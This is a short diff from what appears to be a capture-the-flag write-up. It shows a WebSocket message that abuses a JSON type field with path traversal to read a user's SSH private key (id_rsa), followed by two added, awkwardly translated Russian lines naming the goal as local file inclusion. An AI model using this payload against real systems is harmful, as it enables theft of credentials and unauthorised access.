@@ -273,3 +273,5 @@ ws.onmessage = (event) => {
 }
 ws.send(JSON.stringify({ "RemoveOrder" : {"$type":"bagel_server.File, bagel", "ReadFile":"../../../../../../home/phil/.ssh/id_rsa"}}))
 ```
+Отправляю RemoveOrder на сервер под типом данных bagel_server.Файл является файлом для чтения ../../../../../../ home/phil/.ssh / id_rsa
+цель - реализовать LFI для чтения файла id_rsa.
